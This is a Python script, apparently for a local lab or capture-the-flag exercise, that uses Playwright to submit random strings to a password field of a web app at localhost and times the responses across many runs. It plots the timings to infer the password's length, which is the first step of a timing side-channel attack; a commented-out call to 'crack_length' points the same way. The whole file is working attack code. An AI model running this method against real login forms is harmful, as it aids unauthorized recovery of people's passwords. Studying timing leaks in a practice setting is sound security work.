from playwright.sync_api import Page, sync_playwright
import random
import string
import numpy as np
from time import sleep
import timeit
import matplotlib.pyplot as plt
from multiprocessing import Pool

# GLOBALS
allowed_chars = string.ascii_lowercase + " "
css_selector = "input[aria-label=Password]"

def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))

def check_password(psw: str, box, page) -> str:
    box.fill(psw)
    box.press('Enter')
    sleep(0.11)
    msg = page.locator(".stAlert").inner_text()
    return msg

def timeSomeLenght(i:int) -> list[float]:
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.set_viewport_size({"width": 640, "height": 480})
        page.goto("http://localhost:8502")
        box = page.locator(css_selector)
        myglobals = dict(globals())
        myglobals['page'] = page
        myglobals['box'] = box
        
        i_time = timeit.repeat(
            stmt="""checkPass(x)""",
            setup=f'''
x=random_str({i!r});
def checkPass(x): 
    box.fill(x);
    box.press('Enter');
    sleep(0.11);
    return page.locator(".stAlert").inner_text()
            ''',
            globals=myglobals,
            number=5,
            repeat=200)        
        
    return i_time

def analyze_results(timeprobe):
    
    meantimes = np.mean(timeprobe,axis=1)
    mintimes = np.min(timeprobe,axis=1)
    maxtimes = np.max(timeprobe,axis=1)

    fig,ax = plt.subplots()
    ax.plot(lenghts_to_test, meantimes, alpha=0.5, label="Mean")
    ax.plot(lenghts_to_test, mintimes , marker="x", label="Min")
    #ax.plot(lenghts_to_test, maxtimes , alpha=0.5, label="Max")
    #ax.set_yscale('log')
    ax.legend()
    plt.savefig("times.png")

    print(np.argmax(mintimes) + 1)

def testMultiBrowser(site:str):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        page = browser.new_page()
        page.set_viewport_size({"width": 640, "height": 480})
        page.goto(site)
    return True

if __name__ == "__main__":
    
    lenghts_to_test = list(range(1,13))

    # To run using multiprocessing
    with Pool(processes=12) as pool:
        timesBlob = pool.map(timeSomeLenght,lenghts_to_test)

    times_asnp = np.array(timesBlob)
    np.savetxt("time.txt", times_asnp)
    analyze_results(times_asnp)
    
    # timeprobe = crack_length(verbose=True)
    

    # with Pool() as pool:
    #     blob = pool.map(testMultiBrowser,["https://www.google.com", "http://localhost:8501"])
